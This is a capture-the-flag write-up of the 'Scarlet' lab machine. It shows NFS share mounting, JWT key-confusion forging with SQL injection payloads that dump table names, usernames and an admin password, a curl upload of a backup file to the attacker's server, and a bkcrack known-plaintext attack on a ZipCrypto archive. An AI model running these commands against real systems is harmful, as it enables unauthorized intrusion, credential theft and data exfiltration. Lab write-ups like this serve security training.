#### Enumeration

results of an nmap scan

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
37977/tcp open  unknown
40423/tcp open  unknown
41035/tcp open  unknown
42825/tcp open  unknown
57877/tcp open  unknown
111/udp   open  rpcbind
33779/udp open  unknown
50918/udp open  unknown
57140/udp open  unknown
57739/udp open  unknown
58802/udp open  unknown
```

Trying to mount the share folder through NFS service.

```shell
showmount -e 192.168.183.222
mkdir /tmp/test_folder
sudo mount -t nfs 192.168.183.222:/mnt/share /tmp/test_folder -o nolock
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_12h21m37s_001_.png)

Finding a public key but don't know where to use it. 

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_12h23m17s_002_.png)

Next, we turn to enumerate website. Adding DNS setting.

```
192.168.183.222 scarlet.local
```

Clicking `Author's Portal` to link to the login page. After trying to register many accounts, I find an existing account `brain` the web admin shows on the contacts page.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_13h14m12s_003_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_13h18m41s_004_.png)

Logging in to the website using the previously registered account, but don't find vulnerabilities on the page we can submit publication information. After that, continue to check the session. I notice the page is using JWT to authenticate users. We refer to this [article](https://infosecwriteups.com/attacking-json-web-tokens-jwts-d1d51a1e17cb) try to use JWT SQL injection to gather more information.

We can use exist token to regenerate paylod with SQLi query.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_13h42m22s_005_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_14h13m09s_006_.png)


```shell
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 jwt_tool.py <token> -I -pc <Payload claim to tamper with> -pv "<sql command>" -S hs256 -k /tmp/test_folder/essentials/public.key
# pc = payload claim to tamper with
# public.pem = public key from NFS
```

```shell
# UNION SELECT 1, 2, 3 .... and so on
python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY1ODExMjAzfQ.MrNWoEBf6WB7Jj_CB0iM9Vpt3iU6Lkkf6aPvBdOgQN4MF7PgsfrwXZWnisCtSAvqHzhulFV8AFLpbDgaRi6W54aVx8qq8jHXVMSfRmfwWxDBXKwMzLo79SCszaLCm8S1OC9PZQWDKgsQS-Aqk0D-ADVURV0tMGcY6Y6D8xbiq8_6Xb7gocTf_JstrSAPcIkUfl8Q7ogkVU-SHlJhxzy9A4xV6_FivOJp_zz46LJGOp91u2CmpBhzq_6UsaN4LhgVCOejXesrIwCfWswZjdkmsn686tEGHiuiioaF1XNHpt1stbKVPi8wHZjcaaHBUJF-K_sNpfwoHAuYWYrRVQ6yC4ni_Ib6CDP1F1Ki1lvufgiYp9pndi-geFmGa9YFq79tPzZPIrJuxG9pEhw2a2SQnmx7wxXO0VUhPSKxqPjs4ZRC5PtVU9CqzWbTxrPyBlcUZUzLq1FyP0NpJ3TErz6Mgeesoz3NJTZ6yyWhi_SAXtiOtEfCgMsVwQMxVSXR57akcQTHq9N2uqMdZvXJB50PLeTLSvZbbRQ3HkQVGP_LXSkFpmDwQAuniujsVj8HHcyBIKEeREyJI75-HWWocR60MhlaWfrdmSW2ceCEokfl0Tu57QpsnqQUqnkdcxmgsYzHwIZZEKSgATQ0IGbwjoww17BO26YWU-FG8z7LNq65VDM -I -pc username -pv " ' UNION SELECT 1, 2, 3 --  " -S hs256 -k /tmp/test_folder/essentials/public.key
```

Opening the dev tool and chagne the session value to the new token. After refreshing the page we can see the welcome message has changed.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_14h22m55s_007_.png)

We also can decode the payload to check what exactly we send to server.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_14h29m31s_008_.png)

We have to confirm which database software we are dealing with.

```sql
-- MS SQL
SELECT @@VERSION();
-- MySQL/Postgres
SELECT VERSION();
-- SQLite
SELECT sqlite_version();
```

It's SQLite and then we can use SQLite statements.

```
python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY1ODExMjAzfQ.MrNWoEBf6WB7Jj_CB0iM9Vpt3iU6Lkkf6aPvBdOgQN4MF7PgsfrwXZWnisCtSAvqHzhulFV8AFLpbDgaRi6W54aVx8qq8jHXVMSfRmfwWxDBXKwMzLo79SCszaLCm8S1OC9PZQWDKgsQS-Aqk0D-ADVURV0tMGcY6Y6D8xbiq8_6Xb7gocTf_JstrSAPcIkUfl8Q7ogkVU-SHlJhxzy9A4xV6_FivOJp_zz46LJGOp91u2CmpBhzq_6UsaN4LhgVCOejXesrIwCfWswZjdkmsn686tEGHiuiioaF1XNHpt1stbKVPi8wHZjcaaHBUJF-K_sNpfwoHAuYWYrRVQ6yC4ni_Ib6CDP1F1Ki1lvufgiYp9pndi-geFmGa9YFq79tPzZPIrJuxG9pEhw2a2SQnmx7wxXO0VUhPSKxqPjs4ZRC5PtVU9CqzWbTxrPyBlcUZUzLq1FyP0NpJ3TErz6Mgeesoz3NJTZ6yyWhi_SAXtiOtEfCgMsVwQMxVSXR57akcQTHq9N2uqMdZvXJB50PLeTLSvZbbRQ3HkQVGP_LXSkFpmDwQAuniujsVj8HHcyBIKEeREyJI75-HWWocR60MhlaWfrdmSW2ceCEokfl0Tu57QpsnqQUqnkdcxmgsYzHwIZZEKSgATQ0IGbwjoww17BO26YWU-FG8z7LNq65VDM -I -pc username -pv " ' UNION SELECT sqlite_version(), 2, 3 --  " -S hs256 -k /tmp/test_folder/essentials/public.key
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_15h16m57s_009_.png)


Listing all tables.

```
python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY1ODExMjAzfQ.MrNWoEBf6WB7Jj_CB0iM9Vpt3iU6Lkkf6aPvBdOgQN4MF7PgsfrwXZWnisCtSAvqHzhulFV8AFLpbDgaRi6W54aVx8qq8jHXVMSfRmfwWxDBXKwMzLo79SCszaLCm8S1OC9PZQWDKgsQS-Aqk0D-ADVURV0tMGcY6Y6D8xbiq8_6Xb7gocTf_JstrSAPcIkUfl8Q7ogkVU-SHlJhxzy9A4xV6_FivOJp_zz46LJGOp91u2CmpBhzq_6UsaN4LhgVCOejXesrIwCfWswZjdkmsn686tEGHiuiioaF1XNHpt1stbKVPi8wHZjcaaHBUJF-K_sNpfwoHAuYWYrRVQ6yC4ni_Ib6CDP1F1Ki1lvufgiYp9pndi-geFmGa9YFq79tPzZPIrJuxG9pEhw2a2SQnmx7wxXO0VUhPSKxqPjs4ZRC5PtVU9CqzWbTxrPyBlcUZUzLq1FyP0NpJ3TErz6Mgeesoz3NJTZ6yyWhi_SAXtiOtEfCgMsVwQMxVSXR57akcQTHq9N2uqMdZvXJB50PLeTLSvZbbRQ3HkQVGP_LXSkFpmDwQAuniujsVj8HHcyBIKEeREyJI75-HWWocR60MhlaWfrdmSW2ceCEokfl0Tu57QpsnqQUqnkdcxmgsYzHwIZZEKSgATQ0IGbwjoww17BO26YWU-FG8z7LNq65VDM -I -pc username -pv " ' UNION SELECT (SELECT group_concat(name) FROM sqlite_schema WHERE type = 'table') , 2, 3 --  " -S hs256 -k /tmp/test_folder/essentials/public.key
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_15h52m21s_010_.png)

Listing table `users` schema.

```
python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY1ODExMjAzfQ.MrNWoEBf6WB7Jj_CB0iM9Vpt3iU6Lkkf6aPvBdOgQN4MF7PgsfrwXZWnisCtSAvqHzhulFV8AFLpbDgaRi6W54aVx8qq8jHXVMSfRmfwWxDBXKwMzLo79SCszaLCm8S1OC9PZQWDKgsQS-Aqk0D-ADVURV0tMGcY6Y6D8xbiq8_6Xb7gocTf_JstrSAPcIkUfl8Q7ogkVU-SHlJhxzy9A4xV6_FivOJp_zz46LJGOp91u2CmpBhzq_6UsaN4LhgVCOejXesrIwCfWswZjdkmsn686tEGHiuiioaF1XNHpt1stbKVPi8wHZjcaaHBUJF-K_sNpfwoHAuYWYrRVQ6yC4ni_Ib6CDP1F1Ki1lvufgiYp9pndi-geFmGa9YFq79tPzZPIrJuxG9pEhw2a2SQnmx7wxXO0VUhPSKxqPjs4ZRC5PtVU9CqzWbTxrPyBlcUZUzLq1FyP0NpJ3TErz6Mgeesoz3NJTZ6yyWhi_SAXtiOtEfCgMsVwQMxVSXR57akcQTHq9N2uqMdZvXJB50PLeTLSvZbbRQ3HkQVGP_LXSkFpmDwQAuniujsVj8HHcyBIKEeREyJI75-HWWocR60MhlaWfrdmSW2ceCEokfl0Tu57QpsnqQUqnkdcxmgsYzHwIZZEKSgATQ0IGbwjoww17BO26YWU-FG8z7LNq65VDM -I -pc username -pv " ' UNION SELECT (SELECT sql FROM sqlite_schema WHERE name = 'users') , 2, 3 --  " -S hs256 -k /tmp/test_folder/essentials/public.key
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_15h55m20s_011_.png)

Listing all usernames in table `users`.

```
python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY1ODExMjAzfQ.MrNWoEBf6WB7Jj_CB0iM9Vpt3iU6Lkkf6aPvBdOgQN4MF7PgsfrwXZWnisCtSAvqHzhulFV8AFLpbDgaRi6W54aVx8qq8jHXVMSfRmfwWxDBXKwMzLo79SCszaLCm8S1OC9PZQWDKgsQS-Aqk0D-ADVURV0tMGcY6Y6D8xbiq8_6Xb7gocTf_JstrSAPcIkUfl8Q7ogkVU-SHlJhxzy9A4xV6_FivOJp_zz46LJGOp91u2CmpBhzq_6UsaN4LhgVCOejXesrIwCfWswZjdkmsn686tEGHiuiioaF1XNHpt1stbKVPi8wHZjcaaHBUJF-K_sNpfwoHAuYWYrRVQ6yC4ni_Ib6CDP1F1Ki1lvufgiYp9pndi-geFmGa9YFq79tPzZPIrJuxG9pEhw2a2SQnmx7wxXO0VUhPSKxqPjs4ZRC5PtVU9CqzWbTxrPyBlcUZUzLq1FyP0NpJ3TErz6Mgeesoz3NJTZ6yyWhi_SAXtiOtEfCgMsVwQMxVSXR57akcQTHq9N2uqMdZvXJB50PLeTLSvZbbRQ3HkQVGP_LXSkFpmDwQAuniujsVj8HHcyBIKEeREyJI75-HWWocR60MhlaWfrdmSW2ceCEokfl0Tu57QpsnqQUqnkdcxmgsYzHwIZZEKSgATQ0IGbwjoww17BO26YWU-FG8z7LNq65VDM -I -pc username -pv " ' UNION SELECT (SELECT group_concat(username) FROM users) , 2, 3 --  " -S hs256 -k /tmp/test_folder/essentials/public.key
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_16h30m01s_012_.png)

Because brian is web admin so we try to get his password.

```
python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY1ODExMjAzfQ.MrNWoEBf6WB7Jj_CB0iM9Vpt3iU6Lkkf6aPvBdOgQN4MF7PgsfrwXZWnisCtSAvqHzhulFV8AFLpbDgaRi6W54aVx8qq8jHXVMSfRmfwWxDBXKwMzLo79SCszaLCm8S1OC9PZQWDKgsQS-Aqk0D-ADVURV0tMGcY6Y6D8xbiq8_6Xb7gocTf_JstrSAPcIkUfl8Q7ogkVU-SHlJhxzy9A4xV6_FivOJp_zz46LJGOp91u2CmpBhzq_6UsaN4LhgVCOejXesrIwCfWswZjdkmsn686tEGHiuiioaF1XNHpt1stbKVPi8wHZjcaaHBUJF-K_sNpfwoHAuYWYrRVQ6yC4ni_Ib6CDP1F1Ki1lvufgiYp9pndi-geFmGa9YFq79tPzZPIrJuxG9pEhw2a2SQnmx7wxXO0VUhPSKxqPjs4ZRC5PtVU9CqzWbTxrPyBlcUZUzLq1FyP0NpJ3TErz6Mgeesoz3NJTZ6yyWhi_SAXtiOtEfCgMsVwQMxVSXR57akcQTHq9N2uqMdZvXJB50PLeTLSvZbbRQ3HkQVGP_LXSkFpmDwQAuniujsVj8HHcyBIKEeREyJI75-HWWocR60MhlaWfrdmSW2ceCEokfl0Tu57QpsnqQUqnkdcxmgsYzHwIZZEKSgATQ0IGbwjoww17BO26YWU-FG8z7LNq65VDM -I -pc username -pv " ' UNION SELECT (SELECT password FROM users WHERE username = 'brian') , 2, 3 --  " -S hs256 -k /tmp/test_folder/essentials/public.key
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_16h50m17s_013_.png)

Reusing the passowrd to log in to SSH.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_16h53m57s_014_.png)

#### Privilege Escalation

Finding a backup file in opt folder. We upload it back to our machine.

```shell
# start a HTTP server
sudo python2 ~/Documents/HTTPutServer.py 192.168.49.183 80
```

```shell
# target
curl --upload-file /opt/backup.zip http://192.168.49.183
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_17h08m53s_015_.png)

The zip file has password protected. But we can see all the files that look like the website's source codes.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_17h12m56s_016_.png)

Next, we detect zip file encryption algorithm.

```shell
7z l -slt backup.zip
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_17h20m29s_017_.png)

`Exploiting ZipCrypto`

Tool

```shell
wget https://github.com/kimci86/bkcrack/releases/download/v1.5.0/bkcrack-1.5.0-Linux.tar.gz
```

According to the exploit steps we offer a `Plaintext` file that we can download from website.

```shell
wget http://scarlet.local/assets/images/mbr-9.jpg
```

Zip the file

```shell
zip -r plain.zip mbr-9.jpg
```

```shell
# put the all files in the same folder
./bkcrack -C backup.zip  -c 'web/assets/images/mbr-9.jpg' -P plain.zip -p mbr-9.jpg
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_18h41m48s_018_.png)

```shell
./bkcrack -C backup.zip  -c plain.zip  -k c45cce0e 772c014e 98bbd8be -U test.zip qwert
# -U, --change-password <archive> <password>
#        Create a copy of the encrypted zip archive with the password set to the
#        given new password (requires -C)
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_18h46m34s_019_.png)

We get a private key.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_18h50m30s_020_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_18h52m48s_021_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Scarlet/Scarlet_20221015_18h53m14s_022_.png)